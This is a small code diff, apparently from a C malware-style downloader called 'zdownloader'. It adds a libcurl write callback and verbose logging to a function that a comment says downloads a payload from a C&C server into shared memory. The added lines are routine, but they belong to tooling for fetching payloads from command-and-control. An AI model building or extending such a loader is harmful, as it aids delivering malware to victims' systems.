@@ -1,5 +1,15 @@
 #include "zdownloader.h"
 
+
+static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
+{
+  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
+  fflush( (FILE *)stream );
+  log_info("cURL: written: %d", written);
+  return written;
+}
+
+
 // Download payload from a C&C via HTTPs
 // TODO: refactor
 int url2fd(char *downloadUrl, Shared_Mem_Fd * smf) { 
@@ -29,6 +39,9 @@ int url2fd(char *downloadUrl, Shared_Mem_Fd * smf) {
             return 0;
         }
 
+        /* send all data to this function  */
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, smf->shm_file); 
 		
 		res = curl_easy_perform(curl);
